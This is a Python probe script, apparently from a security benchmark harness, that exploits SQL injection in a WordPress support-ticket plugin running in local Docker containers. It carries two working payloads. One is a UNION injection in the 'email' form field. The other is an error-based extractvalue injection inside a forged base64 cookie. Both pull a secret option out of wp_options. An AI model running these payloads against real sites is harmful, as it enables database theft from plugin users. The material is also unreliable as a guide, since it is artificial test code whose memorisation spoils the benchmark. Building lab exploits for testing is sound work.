#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]

Uses COMPOSE_PROJECT_NAME + PCB_TARGET_PORT from the platform. Seed UNION
reflects pcb_secret in the 302 Location; residual cookie-error recovers it
from extractvalue XPATH errors.
"""
from __future__ import annotations

import base64
import json
import os
import re
import subprocess
import sys
from pathlib import Path
from urllib.parse import quote

import requests

HERE = Path(__file__).resolve().parent.parent
SECRET_OPT = "pcb_secret"
SECRET_OPT_HEX = "0x" + SECRET_OPT.encode().hex()
COOKIE_NAME = "js-support-ticket-token-tkstatus"
SERVICE = {"v0": "wp-v0", "v1": "wp-v1", "v2": "wp-v2"}
BASE = {
    "v0": "http://127.0.0.1:39510",
    "v1": "http://127.0.0.1:39511",
    "v2": "http://127.0.0.1:39512",
}


def _wp_eval(version: str, php: str) -> subprocess.CompletedProcess:
    project = os.environ.get("COMPOSE_PROJECT_NAME") or ""
    cmd = ["docker", "compose"]
    if project:
        cmd += ["-p", project, "--project-directory", str(HERE)]
    else:
        cmd += ["-f", str(HERE / "docker-compose.yml")]
    cmd += ["exec", "-T", SERVICE[version], "wp", "eval", php,
            "--allow-root", "--path=/var/www/html"]
    return subprocess.run(cmd, text=True, capture_output=True, check=False)


def _page_id(version: str) -> int:
    r = _wp_eval(version, 'echo (int)get_option("pcb_page_id");')
    m = re.search(r"\d+", r.stdout or "")
    return int(m.group()) if m else 0


def _forge_cookie(email_payload: str, trackingid: str = "1") -> str:
    token = base64.b64encode(
        json.dumps({"emailaddress": email_payload, "trackingid": trackingid}).encode()
    ).decode()
    return quote(token, safe="")


def _seed_union(base: str, page_id: int) -> dict:
    payload = (
        f"zzz' UNION SELECT option_value FROM wp_options "
        f"WHERE option_name={SECRET_OPT_HEX} LIMIT 1-- -"
    )
    url = f"{base}/?page_id={page_id}"
    r = requests.post(
        url,
        data={
            "form_request": "jssupportticket",
            "jstmod": "ticket",
            "task": "showticketstatus",
            "email": payload,
            "ticketid": "1",
            "jsstpageid": str(page_id),
            "page_id": str(page_id),
        },
        timeout=25,
        allow_redirects=False,
    )
    loc = r.headers.get("Location", "") or ""
    # Flag is in Location (jssupportticketid=<union>). Include it in body
    # so verify.sh's RUN_FLAG grep sees the effect channel.
    return {
        "status": r.status_code,
        "location": loc,
        "body": loc + "\n" + (r.text or "")[:400],
    }


def _cookie_error(base: str, page_id: int) -> dict:
    recovered = ""
    frags = []
    bodies = []
    for start in (1, 21, 41):
        payload = (
            f"x' AND extractvalue(1,concat(0x7e,"
            f"(SELECT SUBSTRING(option_value,{start},20) FROM wp_options "
            f"WHERE option_name={SECRET_OPT_HEX})))-- -"
        )
        cookie = _forge_cookie(payload)
        r = requests.get(
            f"{base}/?page_id={page_id}&jstmod=ticket&jstlay=ticketdetail&jssupportticketid=1",
            headers={"Cookie": f"{COOKIE_NAME}={cookie}"},
            timeout=25,
        )
        bodies.append(r.text or "")
        m = re.search(r"~([0-9A-Za-z_]+)", r.text or "")
        frag = m.group(1) if m else ""
        frags.append(frag)
        if frag:
            recovered += frag
        else:
            break
    return {
        "recovered_flag": recovered,
        "fragments": frags,
        "body": recovered + "\n" + "\n".join(bodies)[:800],
    }


def run_probe(candidate, *, version="v1"):
    base = BASE[version]
    tech = candidate.get("technique") if isinstance(candidate, dict) else str(candidate)
    result = {"version": version, "technique": tech}
    try:
        pid = _page_id(version)
        result["page_id"] = pid
        if tech == "param-union":
            result.update(_seed_union(base, pid))
        elif tech == "cookie-error":
            result.update(_cookie_error(base, pid))
        else:
            result["error"] = f"unknown technique {tech!r}"
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
    return result


_pbt = os.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _v in list(BASE):
        BASE[_v] = _pbt
_pt = os.environ.get("PCB_TARGET_PORT")
if _pt:
    for _v in list(BASE):
        BASE[_v] = f"http://127.0.0.1:{int(_pt)}"

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
